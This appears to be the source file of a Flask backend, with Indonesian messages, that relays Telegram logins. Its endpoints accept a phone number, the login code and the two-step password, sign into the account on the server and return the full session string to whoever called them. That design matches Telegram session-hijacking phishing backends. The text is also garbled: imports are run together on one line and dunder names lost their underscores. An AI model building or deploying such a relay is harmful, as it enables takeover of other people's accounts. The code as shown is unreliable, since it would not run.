from flask import Flask, request, jsonify from telethon.sync import TelegramClient from telethon.sessions import StringSession from flask_cors import CORS import os import asyncio from dotenv import load_dotenv

load_dotenv()

API_ID = int(os.getenv("API_ID")) API_HASH = os.getenv("API_HASH")

SESSION_DIR = "session" if not os.path.exists(SESSION_DIR): os.makedirs(SESSION_DIR)

sessions = {}  # untuk menyimpan sesi sementara

app = Flask(name) CORS(app)

@app.route("/") def home(): return "Telegram Login Backend Aktif"

@app.route("/send_code", methods=["POST"]) def send_code(): data = request.json phone = data.get("phone")

if not phone:
    return jsonify({"error": "Nomor telepon kosong"}), 400

async def send():
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        sessions[phone] = client.session.save()
        await client.disconnect()
        return {"status": "code_sent"}
    except Exception as e:
        return {"error": str(e)}

return jsonify(asyncio.run(send()))

@app.route("/verify_code", methods=["POST"]) def verify_code(): data = request.json phone = data.get("phone") code = data.get("code")

if phone not in sessions:
    return jsonify({"error": "Sesi tidak ditemukan. Kirim kode dulu."}), 400

async def verify():
    try:
        session = StringSession(sessions[phone])
        client = TelegramClient(session, API_ID, API_HASH)
        await client.connect()
        await client.sign_in(phone=phone, code=code)
        session_str = client.session.save()
        await client.disconnect()
        return {"status": "logged_in", "session": session_str}
    except Exception as e:
        return {"error": str(e)}

return jsonify(asyncio.run(verify()))

@app.route("/verify_password", methods=["POST"]) def verify_password(): data = request.json phone = data.get("phone") password = data.get("password")

if phone not in sessions:
    return jsonify({"error": "Sesi tidak ditemukan. Kirim kode dulu."}), 400

async def verify_pw():
    try:
        session = StringSession(sessions[phone])
        client = TelegramClient(session, API_ID, API_HASH)
        await client.connect()
        await client.sign_in(password=password)
        session_str = client.session.save()
        await client.disconnect()
        return {"status": "logged_in", "session": session_str}
    except Exception as e:
        return {"error": str(e)}

return jsonify(asyncio.run(verify_pw()))

if name == "main": app.run(host="0.0.0.0", port=8000)

